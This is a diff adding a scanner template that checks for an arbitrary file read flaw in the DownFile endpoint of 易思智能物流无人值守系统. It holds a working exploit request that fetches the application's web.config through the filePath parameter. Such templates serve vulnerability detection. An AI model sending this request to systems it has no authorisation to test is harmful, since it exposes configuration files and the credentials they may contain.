@@ -1,0 +1,30 @@
+id: poc-yaml-eosine-downfile-anyfile-read
+info:
+  name: 易思智能物流无人值守系统 DownFile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+  description: |
+    This template detects an arbitrary file read vulnerability in 易思智能物流无人值守系统 through the DownFile endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/PublicInfoManage/Upload/DownFile?filePath=web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+      - type: word
+        part: body
+        words:
+          - "<system.web>"
+      - type: regex
+        part: header
+        regex:
+          - "filename=.*"
